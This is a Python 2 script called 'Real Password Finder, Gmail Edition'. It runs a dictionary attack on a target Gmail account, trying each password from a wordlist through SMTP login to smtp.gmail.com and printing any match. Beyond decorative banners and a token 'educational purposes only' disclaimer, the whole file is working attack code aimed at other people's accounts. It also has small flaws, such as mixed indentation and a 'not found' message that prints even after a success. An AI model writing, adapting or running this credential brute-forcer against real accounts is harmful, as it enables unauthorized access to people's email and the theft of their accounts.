# -*- coding: utf-8 -*-
#!/usr/bin/python
import sys
import os
import smtplib                #Importing LIbraries
import socket
import subprocess
import time
from random import randint

#Defining colors
class bcolors:
	HEADER = '\033[95m' #move
	OKBLUE = '\033[94m' #blue
	OKGREEN = '\033[92m' #green
	WARNING = '\033[93m' #orange                                  
	FAIL = '\033[91m' #red
	ENDC = '\033[0m' #end color
	BOLD = '\033[1m' #gras
	UNDERLINE = '\033[4m' #underline
        BLEUCIEL = '\033[1;36m' #bleuciel

#Defining variables
rpfp = bcolors.BLEUCIEL + 'Real Password Finder@:' + bcolors.ENDC + ' '
logfile = open ("logfile.txt",'w')
start_time = time.time()
tick = bcolors.OKGREEN + '✔' + bcolors.ENDC + ' '
untick = bcolors.FAIL + '✘' + bcolors.ENDC + ' '

#Checking for the root acces 
if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] Real Password Finder Tool must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")

#Clear Command
os.system("clear")

#banners
#banner1
print(""" \033[1;36m
                                       ┌═════════════════════════════════════════════════════════════════════════════┐
                                       █                                                                             █
                                       █              ツ     Executing Real Password Finder Tool     ツ              █ 
                                       █                                                                             █
                                       └═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")

time.sleep(0.25)
#banner2
print ' '
print ' '
print '                      ____  _____    _    _       ____   _    ____ ______        _____  ____  ____     _____ ___ _   _ ____  _____ ____'
print '                     |  _ \| ____|  / \  | |     |  _ \ / \  / ___/ ___\ \      / / _ \|  _ \|  _ \   |  ___|_ _| \ | |  _ \| ____|  _ \.' 
print '                     | |_) |  _|   / _ \ | |     | |_) / _ \ \___ \___\.\ \ /\ / / | | |  |_) |  | |  | |_   | ||  \| | | | |  _| | |_) |' 
print '                     |  _ <| |___ / ___ \| |___  |  __/ ___ \ ___) |__) |\ V  V /| |_| |  _ <| |_| |  |  _|  | || |\  | |_| | |___|  _ < '
print '                     |_| \_\_____/_/   \_\_____| |_| /_/   \_\____/____/  \_/\_/  \___/|_| \_\____/   |_|   |___|_| \_|____/|_____|_| \_\.'
print ' '
print ' '
time.sleep(1)

#banner3
print(""" \033[1;36m
                            ┌════════════════════════════════════════════════════════════════════════════════════════════════════┐
                            █                                                                                                    █ 
                            █       ツ      Real Password Finder Tool By AzizVirus Is Coded By Python On Kali Linux    ツ        █
                            █                                                                                                    █
                            └════════════════════════════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")
#banner4
time.sleep(1)
print          bcolors.OKGREEN + '                ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ  ツ ツ ツ ツ ツ ツ ツ  ツ  ツ          '
print '  '
print          bcolors.OKGREEN + '                ツ ################################## Real password finder V1.0 started ###########################################  ツ         '
print ' '
print          bcolors.OKGREEN + '                ツ #####################################  !!!  Gmail Edition  !!!  ################################################  ツ           ' 
print ' '
print          bcolors.OKGREEN + '                ツ ####################  This Tool was Made by Aziz Becha, use for educational purposes only ! ####################  ツ        ' 
print ' '
print          bcolors.OKGREEN + '                ツ ##########################  This Tool Is Using Brute-Force And Dictionnary Attack !  ###########################  ツ      ' 
print '  '
print          bcolors.OKGREEN + '                ツ ##############################   Please Do Not use for illegal purposes   ######################################  ツ     ' 
print '   '
print          bcolors.OKGREEN + '                ツ ##################################  Contact me if there is some bugs   #########################################  ツ    ' 
print ' '
print  ' '
time.sleep(0.25)
print          bcolors.OKGREEN + '                ツ ######################################  Facebook: Aziz Bécha  ##################################################  ツ  '
print '  '
print          bcolors.OKGREEN + '                ツ #######################################  Developper: Aziz Becha  ###############################################  ツ     '
print '  '
print          bcolors.OKGREEN + '                ツ ####################################### CERTIFIED ETHICAL HACKER  ##############################################  ツ          '
print                            '                                                                                                                                              '
print ' '                                                                                                                                   
time.sleep(0.25)
print          bcolors.OKGREEN + '                ツ ######################################  All rights Reserved ! ! !  #############################################  ツ            '
print ' '
print          bcolors.OKGREEN + '                ツ ############################ 3> Hack Like a Pro ... Hack Like an Intelligent :) 3> #############################  ツ          '
print ' '
time.sleep(0.25)
print          bcolors.OKGREEN + '                ツ ##########################  This Tool Will Try To Find The Real Password for Gmail  ############################  ツ   '
print ' '
print          bcolors.OKGREEN + '                ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ  '
print ' '
print ' ' + bcolors.ENDC + ' '
time.sleep(1.5)
#banner5
def banner():

   print bcolors.BLEUCIEL +'                    _______________________________________________________________________________'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                         *Email Checker Login Page*                          |'
   print bcolors.BLEUCIEL +'                    |_____________________________________________________________________________|'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                 User Name:          [     hacker    ]                       |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                 Password:           [     ******    ]                       |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                              Say The Magic Word                             |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                                  -[ Login ]-                                |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                         Forgot Password ? Click Here                        |'
   print bcolors.BLEUCIEL +'                    |_____________________________________________________________________________|'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |               Bussiness Requires Only: Facebook: Aziz Bécha                 |'
   print bcolors.BLEUCIEL +'                    |               Follow Me On Github for more Tools: AzizVirus                 |'
   print bcolors.BLEUCIEL +'                    |                  © Copyright 2020.. All Rights Reserved ! ©                 |'
   print bcolors.BLEUCIEL +'                    |_____________________________________________________________________________|' + bcolors.ENDC + ' '
   print ' '
   print ' '
   print ' '
   print ' '
   time.sleep(0.75)
#printing the banner
banner()

print rpfp + bcolors.BOLD + '{ '+tick+'} ping (www.gmail.com)' + bcolors.OKBLUE +  ' ' # Pinging gmail alert
time.sleep(0.25)
print ' '
print rpfp + '{ '+tick+'/ '+untick+'} Checking Gmail availability was started'  #checking availability notification
print ' '
os.system("ping www.gmail.com -c 3")  #pinging gmail command 
print ' '
print rpfp + '{ '+tick+'} Gmail is now available to work !' #gmail availability alert
print ' '
print rpfp + '{ '+tick+'} Connecting To The Server ! ' + bcolors.ENDC + ' '
print ' '
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)  #Defining the smtp server
smtpserver.ehlo()
smtpserver.starttls() #connecting to the server
print rpfp + '{ '+tick+'} Connected !' + bcolors.ENDC + ' '
print ' '
user = raw_input( rpfp + "{ "+tick+"} Enter the Target's Email Address ==>  ") #selecting target
print ' '
print rpfp + bcolors.FAIL + "("+user +")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Target's email succesfully selected ! ==> " + user + bcolors.ENDC + ' '     # target selected alert
print '   '                      
passwfile = raw_input( rpfp + bcolors.FAIL + "("+user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Enter the password file name ==>  ") #selecting password file
print ' '
print rpfp + bcolors.FAIL + "("+ user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Password File Succesfully Selected ! ==> " + passwfile + bcolors.ENDC + ' ' #passwordfile selected alert
print " "
time.sleep(0.25)
passwfile = open(passwfile, "r")
print rpfp + bcolors.FAIL + "("  + user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Brute Force Attack will start now !  " + bcolors.ENDC  + ' ' #bruteforce attack starting alert
time.sleep(0.25)
print ' '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Attack Status: Started Now !!! " + bcolors.ENDC + ' '  #bruteforce attack started alert
print ' '
logfile.write (user) #open the logfile and write the user selected (target)
logfile.close() #close the logfile
time.sleep(0.25)

for password in passwfile:  #search for the passwords in the password file
        try:
                smtpserver.login(user, password) #try the username and the passwords in the passwfile 
 
                print " [✔] Password Found ==>  : %s" % password   #password found alert
                break;
        except smtplib.SMTPAuthenticationError: #error log
                print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' ' + "[ "+untick+"] Password Incorrect ==>  : %s" % password #password incorrect alert
                                                                                                                                                                         
print rpfp + bcolors.FAIL + "(" + user + ")"  +  " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Scanning Status: complete !" + bcolors.ENDC + ' '    #scan finished alert
time.sleep(0.25)
print ' '
print rpfp + bcolors.FAIL + "(" + user  + ")" + " > " + bcolors.ENDC +  "{ "+untick+"} All The Passwords for " + "(" + user + ") " +  'Are Checked But No One Works ¯\_(ツ)_/¯ ' 
print '  '
print rpfp + bcolors.FAIL + "(" + user + ")" +  " >" + bcolors.ENDC + " { "+untick+"} Real Password for " + user + " Not Found !  " + bcolors.ENDC + ' ' #password not found alert
print '   '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + " { "+tick+"} Try To Change The Keywords And Generate A New More Powerful Password List ¯\_(ツ)_/¯ " + bcolors.ENDC + ' '
print ' '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + " { "+untick+'} Your Target ' + "( " + user + " )" + ' Was not Hacked!' + bcolors.ENDC + ' '   #target not hacked alert
time.sleep(0.5)
print '   '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' { '+tick+'} Time elapsed: ' + str(time.time() - start_time) + bcolors.ENDC + ' '   #time elapsed in tool
time.sleep(0.25)
print '  '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' { '+tick+'} Good Luck Next Time ! ' + bcolors.ENDC + ' '
print ' '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC +  ' { '+untick+'} Exiting Now !' + bcolors.ENDC + ' ' #exiting alert
print ' '
print rpfp + "[ "+ untick+"] Exit !" + bcolors.ENDC # exit alert
print ' '
print ' '
sys.exit #exiting command
